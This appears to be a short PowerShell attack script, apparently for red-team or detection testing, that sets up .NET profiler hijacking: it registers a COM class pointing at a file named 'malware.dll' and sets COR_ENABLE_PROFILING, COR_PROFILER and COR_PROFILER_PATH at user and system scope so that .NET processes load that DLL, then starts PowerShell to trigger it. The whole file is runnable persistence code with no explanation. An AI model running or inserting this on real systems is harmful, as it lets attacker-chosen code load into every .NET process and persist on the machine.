$clsid_guid = "09108e71-974c-4010-89cb-acf471ae9e2c"
$file_name = "D:\abcd\malware.dll"

#User Scope

Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\{$clsid_guid}" -ForegroundColor Cyan
New-Item -Path "HKCU:\Software\Classes\CLSID\{$clsid_guid}\InprocServer32" -Value $file_name -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "{$clsid_guid}" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value $file_name -Force | Out-Null


#System Scope

Write-Host "Creating system environment variables" -ForegroundColor Cyan
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "{$clsid_guid}" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value $file_name -Force | Out-Null


#Non Reg

$env:COR_ENABLE_PROFILING = 1
$env:COR_PROFILER = "{clsid_guid}"
$env:COR_PROFILER_PATH = $file_name
POWERSHELL -c 'Start-Sleep 1'